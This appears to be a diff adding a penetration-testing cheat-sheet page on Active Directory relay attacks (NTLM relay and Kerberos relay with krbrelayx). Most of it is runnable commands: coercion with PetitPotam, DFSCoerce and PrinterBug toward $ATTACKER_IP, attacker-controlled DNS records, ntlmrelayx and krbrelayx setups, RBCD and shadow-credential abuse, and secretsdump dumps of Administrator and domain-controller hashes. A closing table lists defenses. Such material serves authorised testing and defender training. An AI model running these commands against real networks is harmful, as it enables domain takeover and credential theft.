@@ -1,0 +1,257 @@
+---
+title: "Relay Attacks"
+---
+
+Relay attacks intercept authentication attempts and forward them to a different target than the one the victim intended to reach. The two main variants are NTLM relay (exploits NTLM's lack of target binding) and Kerberos relay (exploits DNS to redirect ticket requests to a service you control).
+
+## Theory
+
+### NTLM Relay
+
+NTLM is a challenge-response protocol. The response is not cryptographically bound to which server it was intended for, so you can forward it anywhere.
+
+| Step | Who | Action |
+|------|-----|--------|
+| 1 | Client | Sends authentication request to attacker |
+| 2 | Attacker | Forwards request to real target, receives challenge |
+| 3 | Attacker | Sends challenge back to client |
+| 4 | Client | Computes NTLM response, sends it to attacker |
+| 5 | Attacker | Forwards response to real target |
+| 6 | Target | Accepts auth; attacker now acts as the client |
+
+### Kerberos Relay
+
+Kerberos tickets are bound to a specific SPN (e.g. `HTTP/target.domain.com`). A ticket meant for SMB cannot be forwarded to HTTP. The attack works by making the victim request a ticket for a hostname you control.
+
+| Step | Action |
+|------|--------|
+| 1 | Add a DNS record pointing `attacker.domain.com` to your IP |
+| 2 | Coerce the victim to authenticate to `attacker.domain.com` |
+| 3 | Victim requests a TGS for `HTTP/attacker.domain.com` |
+| 4 | krbrelayx decrypts it (you control the SPN secret) and replays to the real target |
+| 5 | Target sees valid authentication and issues a certificate or grants access |
+
+## Prerequisites
+
+### NTLM Relay to LDAP
+
+- LDAP signing not enforced (default on older DCs)
+- LDAP channel binding not enforced
+- SMB signing disabled on the coercion source, OR WebClient running on the target (enables HTTP coercion, bypassing SMB signing)
+- Target is not the same machine as the coercion source (no self-relay)
+
+### Kerberos Relay (krbrelayx)
+
+- DNS write access (all domain users can add records by default via `dnstool.py`)
+- Target service accepts Kerberos (`Negotiate` header present on HTTP endpoint)
+- NTLM disabled domain-wide, or preference for Kerberos relay
+- A coercion primitive available (DFSCoerce, PetitPotam, PrinterBug)
+
+## Enumeration
+
+```bash wrap
+# Check SMB signing (signing:True = SMB-to-SMB relay blocked on that host)
+nxc smb $TARGETS --gen-relay-list relay_targets.txt
+
+# Check LDAP signing and channel binding
+nxc ldap $DC -u $USER -p $PASSWORD -M ldap-checker
+
+# Check WebClient service (enables HTTP coercion from workstations)
+nxc smb $TARGETS -u $USER -p $PASSWORD -M webdav
+
+# Check MachineAccountQuota (needed to create a computer account for RBCD)
+nxc ldap $DC -u $USER -p $PASSWORD -M maq
+
+# Check whether NTLM is disabled (NTLM:False in output means disabled)
+nxc smb $DC -u '' -p ''
+```
+
+## Coercion Primitives
+
+```bash wrap
+# PetitPotam (MS-EFSRPC): works unauthenticated in older environments
+python3 PetitPotam.py -u $USER -p $PASSWORD -d $DOMAIN $ATTACKER_IP $TARGET
+
+# DFSCoerce (MS-DFSNM): useful when PetitPotam is patched
+python3 dfscoerce.py -u $USER -p $PASSWORD -d $DOMAIN $ATTACKER_IP $TARGET
+
+# PrinterBug (MS-RPRN)
+python3 printerbug.py $DOMAIN/$USER:$PASSWORD@$TARGET $ATTACKER_IP
+
+# WebClient HTTP coercion: bypasses SMB signing requirement
+# Attacker hostname must resolve via DNS first (use dnstool.py below)
+python3 PetitPotam.py -u $USER -p $PASSWORD -d $DOMAIN $ATTACKER_IP@80/test $TARGET
+```
+
+## DNS Record Management
+
+Required before WebClient coercion and Kerberos relay.
+
+```bash wrap
+# Add a DNS A record pointing to your IP (krbrelayx toolkit)
+python3 dnstool.py -u '$DOMAIN\$USER' -p $PASSWORD \
+  -r attacker.$DOMAIN -a add -d $ATTACKER_IP $DC
+
+# Remove after the engagement
+python3 dnstool.py -u '$DOMAIN\$USER' -p $PASSWORD \
+  -r attacker.$DOMAIN -a remove -d $ATTACKER_IP $DC
+
+# Via bloodyAD (Kerberos auth)
+bloodyAD -d $DOMAIN -u $USER -k ccache=/tmp/ticket.ccache \
+  --host $DC add dnsRecord 'attacker' $ATTACKER_IP
+```
+
+## NTLM Relay
+
+### ntlmrelayx Setup
+
+```bash wrap
+# Relay to LDAP: interactive shell (most flexible, manual post-exploitation)
+ntlmrelayx.py -t ldap://$DC -smb2support -i
+
+# Relay to LDAPS: auto-configure RBCD
+ntlmrelayx.py -t ldaps://$DC -smb2support --delegate-access
+
+# Relay to LDAPS: shadow credentials (writes msDS-KeyCredentialLink)
+ntlmrelayx.py -t ldaps://$DC -smb2support --shadow-credentials
+
+# Relay to SMB: execute a command (SMB signing must be disabled on target)
+ntlmrelayx.py -t smb://$TARGET -smb2support -c 'whoami'
+
+# Relay to LDAPS: drop MIC (requires NTLMv1 or CVE-2019-1040)
+ntlmrelayx.py -t ldaps://$DC --remove-mic -smb2support
+
+# Relay to ADCS over HTTP (ESC8)
+ntlmrelayx.py -t http://$CA/certsrv/certfnsh.asp --adcs --template DomainController
+```
+
+<Info>
+Add `--no-dump --no-da --no-acl --no-validate-privs` to suppress default auto-actions and stay in manual control.
+</Info>
+
+### Interactive LDAP Shell
+
+When run with `-i`, ntlmrelayx opens a local shell on `127.0.0.1:1100x` for each relayed session.
+
+```bash wrap
+nc 127.0.0.1 11000
+
+# Inside the shell:
+help
+set_rbcd $TARGET$ $CONTROLLED_COMPUTER$
+add_computer EVILPC 'Password123!'
+write_gpo_dacl $USER GPO-GUID
+```
+
+## Post-Relay: LDAP Write Primitives
+
+### RBCD
+
+After the relay sets `msDS-AllowedToActOnBehalfOfOtherIdentity` on `$TARGET$`, request an impersonation ticket from your controlled computer account.
+
+```bash wrap
+# Request impersonation ticket
+getST.py -spn 'cifs/$TARGET.$DOMAIN' -impersonate Administrator \
+  -dc-ip $DC '$DOMAIN/EVILPC$:Password123!'
+
+# Use the ticket
+export KRB5CCNAME=Administrator@cifs_$TARGET.ccache
+nxc smb $TARGET --use-kcache --sam
+secretsdump.py -k -no-pass $DOMAIN/Administrator@$TARGET
+```
+
+### Shadow Credentials
+
+After the relay writes to `msDS-KeyCredentialLink`, ntlmrelayx outputs a `.pfx` file. Use it to get a TGT, then extract the NT hash.
+
+```bash wrap
+# Get TGT from the certificate
+python3 PKINITtools/gettgtpkinit.py \
+  -cert-pfx $FILE.pfx -pfx-pass $PFX_PASS \
+  $DOMAIN/'$TARGET$' $TARGET.ccache
+
+# Extract NT hash from the TGT
+KRB5CCNAME=$TARGET.ccache python3 PKINITtools/getnthash.py \
+  -key $AS_REP_KEY -dc-ip $DC '$DOMAIN/$TARGET$'
+
+# Impersonate a domain admin via S4U
+python3 PKINITtools/gets4uticket.py \
+  'kerberos+ccache://$DOMAIN\$TARGET$:$TARGET.ccache@$DC' \
+  'cifs/$TARGET.$DOMAIN@$DOMAIN' 'Administrator@$DOMAIN' admin.ccache
+```
+
+## Kerberos Relay (krbrelayx)
+
+### Setup
+
+```bash wrap
+# Relay to ADCS HTTP endpoint (ESC8, DomainController template)
+sudo python3 krbrelayx.py \
+  --target http://$CA/certsrv/certfnsh.asp \
+  --adcs --template DomainController \
+  --interface-ip $ATTACKER_IP
+
+# Relay to LDAP
+sudo python3 krbrelayx.py --target ldap://$DC
+```
+
+### DNS Record for DFSCoerce Coercion
+
+Windows embeds a Base64-encoded `CREDENTIAL_TARGET_INFO` structure in the SPN during DFSCoerce auth. The marshalled DNS name encodes the target NetBIOS name. Use dirkjan's krbrelayx helpers to generate the correct string for your target.
+
+```bash wrap
+# Add the marshalled DNS record
+python3 dnstool.py -u '$DOMAIN\$USER' -p $PASSWORD \
+  -r 'DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' \
+  -a add -d $ATTACKER_IP $DC
+
+# Via bloodyAD (Kerberos auth)
+bloodyAD -d $DOMAIN -u $USER -k ccache=/tmp/ticket.ccache \
+  --host $DC --dc-ip $DC_IP \
+  add dnsRecord 'DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' $ATTACKER_IP
+```
+
+### Coerce with DFSCoerce
+
+```bash wrap
+KRB5CCNAME=/tmp/ticket.ccache python3 dfscoerce.py -k -no-pass \
+  'DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' $DC_FQDN
+
+# Expected response: DFSNM SessionError: ERROR_BAD_NETPATH (coercion worked)
+```
+
+### Certificate to Domain Admin
+
+krbrelayx writes a `.pfx` to the current directory on successful relay.
+
+```bash wrap
+# Get a TGT for the DC machine account from the certificate
+python3 gettgtpkinit.py -cert-pfx unknown1234.pfx \
+  $DOMAIN/'$DC_MACHINE$' dc.ccache
+
+# Dump with the DC machine TGT
+export KRB5CCNAME=dc.ccache
+secretsdump.py -k -no-pass -just-dc-user Administrator \
+  $DOMAIN/'$DC_MACHINE$'@$DC_FQDN
+```
+
+## Decision Tree
+
+| Condition | Path |
+|-----------|------|
+| NTLM enabled, SMB signing disabled on target | ntlmrelayx SMB coercion to SMB exec |
+| NTLM enabled, SMB signing enforced, WebClient running | HTTP coercion via PetitPotam to ntlmrelayx LDAP/LDAPS |
+| NTLM enabled, no WebClient, NTLMv1 or CVE-2019-1040 present | ntlmrelayx with `--remove-mic` to LDAPS |
+| NTLM disabled, HTTP service with `Negotiate` header present | krbrelayx + DNS record + coercion |
+| Any NTLM relay to LDAPS succeeds | RBCD, shadow credentials, or DCSync via WriteDACL |
+| ADCS CA web enrollment reachable | ESC8 via ntlmrelayx or krbrelayx |
+
+## Defenses
+
+| Control | What it blocks |
+|---------|----------------|
+| LDAP signing enforced | NTLM relay to LDAP |
+| LDAP channel binding | NTLM relay to LDAPS |
+| SMB signing on all hosts | SMB-to-SMB relay (does not block LDAP relay via WebClient coercion) |
+| NTLM disabled domain-wide | All NTLM relay; note this enables Kerberos relay as an alternative |
+| EPA (Extended Protection for Auth) on web endpoints | NTLM relay to HTTP/ADCS |
